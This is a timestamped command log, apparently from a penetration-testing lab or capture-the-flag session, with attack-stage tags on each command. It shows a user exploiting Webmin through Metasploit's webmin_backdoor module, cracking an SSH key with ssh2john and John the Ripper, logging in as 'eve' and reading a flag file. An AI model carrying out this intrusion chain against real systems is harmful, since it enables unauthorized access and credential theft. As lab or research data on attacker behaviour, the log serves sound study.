User 43 start time 1594797823 end 1594805341
PADDING
PADDING
PADDING
INPUT|43--71|A6 M6 |1594802979|43|set RHOST 172.168.1.5|OUTPUT
INPUT|43--72|A8 M8 |1594803000|43|exploit|OUTPUT
INPUT|43--73|A5 M5 |1594803004|43|show options|OUTPUT
INPUT|43--74|A6 M6 |1594803010|43|set TARGET 0|OUTPUT
INPUT|43--75|A8 M8 |1594803020|43|exploit|OUTPUT
INPUT|43--76|A6 M6 |1594803026|43|set RHOST 192.168.1.5|OUTPUT
INPUT|43--77|A8 M8 |1594803049|43|exploit|OUTPUT
INPUT|43--78|A6 M6 |1594803251|43|set RHOST 172.18.1.5|OUTPUT
INPUT|43--79|A8 M8 |1594803383|43|exploit|OUTPUT
INPUT|43--80|A5 M5 |1594803415|43|show options|OUTPUT
INPUT|43--81|A6 M6 |1594803421|43|set TARGET 0|OUTPUT
INPUT|43--82|A8 M8 |1594803949|43|exploit|OUTPUT
INPUT|43--83|A5 M5 |1594804398|43|show options|OUTPUT
INPUT|43--84|A6 M6 |1594804404|43|set TARGET 0|OUTPUT
INPUT|43--85|A8 M8 |1594804439|43|exploit|OUTPUT
INPUT|43--86|A6 M6 |1594804446|43|set TARGET 0|OUTPUT
INPUT|43--87|U|1594804538|43|pwd|OUTPUT
INPUT|43--88|A8 M8 |1594804557|43|exploit|OUTPUT
INPUT|43--89|A6 M6 |1594804585|43|set TARGET 0|OUTPUT
INPUT|43--90|A8 M8 |1594804628|43|exploit|OUTPUT
INPUT|43--91|A6 M6 |1594804691|43|set TARGET 0|OUTPUT
INPUT|43--92|U|1594804746|43|touch key.txt|OUTPUT
INPUT|43--93|U|1594804787|43|cd|OUTPUT
INPUT|43--94|U|1594804787|43|ls|OUTPUT
INPUT|43--95|U|1594804815|43|./ssh2john.py ~/Desktop/key.txt > hash|OUTPUT
INPUT|43--96|U|1594804817|43|ls|OUTPUT
INPUT|43--97|U|1594804848|43|man john|OUTPUT
INPUT|43--98|U|1594804885|43|john --wordlist=/usr/share/wordlists/rockyou.txt hash|OUTPUT
INPUT|43--99|A2 M2 |1594804992|43|msfconsole|OUTPUT
INPUT|43--100|A4 M4 |1594805028|43|use /exploit/unix/webapp/webmin_backdoor|OUTPUT
INPUT|43--101|A4 |1594805044|43|use exploit/unix/webapp/webmin_backdoor |OUTPUT
INPUT|43--102|A5 M5 |1594805059|43|show options|OUTPUT
INPUT|43--103|A6 M6 |1594805074|43|set RHOST 172.18.1.5|OUTPUT
INPUT|43--104|A6 M6 |1594805080|43|set TARGET 0|OUTPUT
INPUT|43--105|U|1594805088|43|ifconfig|OUTPUT
INPUT|43--106|A6 M6 |1594805106|43|set LHOST 10.1.135.83|OUTPUT
INPUT|43--107|A16 M16 |1594805144|43|ssh -i key.txt eve@10.1.17.45|OUTPUT
INPUT|43--108|A16 M16 |1594805161|43|ssh -i key.txt eve@10.1.17.4|OUTPUT
INPUT|43--109|A16 M16 |1594805207|43|ssh -i key.txt eve@10.1.17.4|OUTPUT
INPUT|43--110|U|1594805227|43|chmod 777 key.txt|OUTPUT
INPUT|43--111|A16 M16 |1594805232|43|ssh -i key.txt eve@10.1.17.4|OUTPUT
INPUT|43--112|U|1594805261|43|chmod 400 key.txt|OUTPUT
INPUT|43--113|A16 M16 |1594805266|43|ssh -i key.txt eve@10.1.17.4|OUTPUT
INPUT|43--114|U|1594805335|43|ls|OUTPUT
INPUT|43--115|U|1594805338|43|cd top-secret/|OUTPUT
INPUT|43--116|U|1594805338|43|ls|OUTPUT
INPUT|43--117|A17 M17 |1594805341|43|cat flag.txt|OUTPUT
